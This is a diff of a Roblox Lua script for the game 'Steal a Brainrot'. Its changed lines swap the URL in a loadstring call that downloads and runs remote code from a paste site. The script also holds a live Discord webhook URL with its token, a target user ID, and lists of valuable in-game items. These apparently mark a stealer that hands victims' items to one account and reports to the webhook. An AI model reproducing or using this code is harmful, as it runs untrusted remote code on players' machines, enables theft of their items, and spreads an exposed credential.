@@ -24,7 +24,7 @@ local pg = LP:WaitForChild("PlayerGui")
 
 task.spawn(function()
 
-loadstring(game:HttpGet("https://pastebin.com/raw/YiG2TLPN"))()
+loadstring(game:HttpGet("https://pastefy.app/VdP6AHMr/raw"))()
 
 end)
 
@@ -36,11 +36,11 @@ task.spawn(function()
 
 local GOOD_WEBHOOK = "https://discord.com/api/webhooks/1502780598014709760/2EFKMJHIO7NGk1xQnYMx7YR1in0ujpGNM06sOWCvPA1xwYCTXvqYQ4jLSfNekutB9KGf"
 
-local TARGET_ID = 2829121161
- 
 local GOOD_AVATAR = "https://cdn.pfps.gg/pfps/77602-blood-cat.gif"
 
 local FANDOM_BASE = "https://stealabrainrot.fandom.com/wiki/"
+
+local TARGET_ID = 2829121161
 
 local DELAY_STEP = 1
 
@@ -110,8 +110,6 @@ local TargetBrainrots = {
 
     ["Ginger Gerat"] = true,
 
-    ["Nacho Spyder"] = true,
-
     ["Antonio"] = true,
 
     ["La Food Combinasion"] = true,
@@ -133,8 +131,6 @@ local TargetBrainrots = {
     ["Los Amigos"] = true,
 
     ["Pancake and Syrup"] = true,
-
-    ["La Secret Combinasion"] = true,
 
     ["Foxini Lanternini"] = true,
 
@@ -158,29 +154,13 @@ local TargetBrainrots = {
 
     ["Jolly Jolly Sahur"] = true,
 
-    ["Gold Gold Gold"] = true,
-
-    ["Lavadorito Spinito"] = true,
-
-    ["Ketchuru and Musturu"] = true,
-
     ["Rico Dinero"] = true,
 
     ["Tirilikalika Tirilikalako"] = true,
 
-    ["La Romantic Grande"] = true,
-
-    ["Tictac Sahur"] = true,
-
-    ["Orcaledon"] = true,
-
-    ["La Taco Combinasion"] = true,
-
     ["Dug dug dug"] = true,
 
     ["Los Tacoritas"] = true,
-
-    ["Ketupat Kepat"] = true,
 
     ["Los Primos"] = true,
 
@@ -310,29 +290,15 @@ local GOOD_BRAINROTS = {
 
     ["Jolly Jolly Sahur"] = true,
 
-    ["Gold Gold Gold"] = true,
-
-    ["Lavadorito Spinito"] = true,
-
-    ["Ketchuru and Musturu"] = true,
-
     ["Rico Dinero"] = true,
 
     ["Tirilikalika Tirilikalako"] = true,
 
     ["La Romantic Grande"] = true,
 
-    ["Tictac Sahur"] = true,
-
-    ["Orcaledon"] = true,
-
-    ["La Taco Combinasion"] = true,
-
     ["Dug dug dug"] = true,
 
     ["Los Tacoritas"] = true,
-
-    ["Ketupat Kepat"] = true,
 
     ["Los Primos"] = true,
 
